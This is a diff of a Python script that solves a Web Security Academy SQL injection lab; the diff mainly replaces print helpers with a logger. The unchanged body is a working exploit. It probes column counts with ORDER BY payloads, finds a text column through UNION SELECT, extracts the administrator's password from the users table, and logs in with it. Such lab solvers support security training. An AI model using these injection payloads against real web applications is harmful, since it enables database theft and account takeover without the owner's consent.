@@ -1,26 +1,26 @@
-from web_security_academy.core.utils import *
+from web_security_academy.core.logger import logger
 from bs4 import BeautifulSoup
 
 
 def solve_lab(session):
     path = "/filter"
 
-    print_info("Determining the number of columns...")
+    logger.info("Determining the number of columns...")
 
     num_columns = 0
     i = 1
     while True:
         params = {"category": f"' ORDER BY {i} -- //"}
         resp = session.get_path(path, params=params)
-        print_info_secondary(f"{params} => {resp.status_code}")
+        logger.info(f"{params} => {resp.status_code}")
         if resp.status_code == 500:
             break
         else:
             num_columns += 1
             i += 1
 
-    print_success(f"There are {num_columns} columns.\n")
-    print_info("Finding a column with the string data type...")
+    logger.success(f"There are {num_columns} columns.")
+    logger.info("Finding a column with the string data type...")
 
     i = 0
     while i < num_columns:
@@ -30,16 +30,17 @@ def solve_lab(session):
 
         params = {"category": f"' UNION SELECT {columns} -- //"}
         resp = session.get_path(path, params=params)
-        print_info_secondary(f"{params} => {resp.status_code}")
+        logger.info(f"{params} => {resp.status_code}")
         if resp.status_code == 200:
             break
         else:
             i += 1
 
     if i == num_columns:
-        print_fail("Unable to find a column with the string data type")
+        logger.failure("Unable to find a column with the string data type")
+        return
     else:
-        print_success(f"Column {i} has the string data type.\n")
+        logger.success(f"Column {i} has the string data type.")
 
     columns = ["null"] * num_columns
     columns[i] = "password"
@@ -48,19 +49,20 @@ def solve_lab(session):
         "category": f"' UNION SELECT {columns} FROM users WHERE username = 'administrator' --"
     }
 
-    print_info(
+    logger.info(
         f'Extracting administrator password by visiting "{path}" with the following parameters:'
     )
-    print(params)
+    logger.info(params)
 
     resp = session.get_path(path, params=params)
     soup = BeautifulSoup(resp.text, "lxml")
     query = soup.find(lambda tag: tag.name == "th")
 
     if query is None:
-        print_fail("Unable to extract administrator password.")
+        logger.failure("Unable to extract administrator password.")
+        return
 
     password = query.text
-    print_success(f"Found administrator password: {password}\n")
+    logger.success(f"Found administrator password: {password}")
 
     session.login("administrator", password)
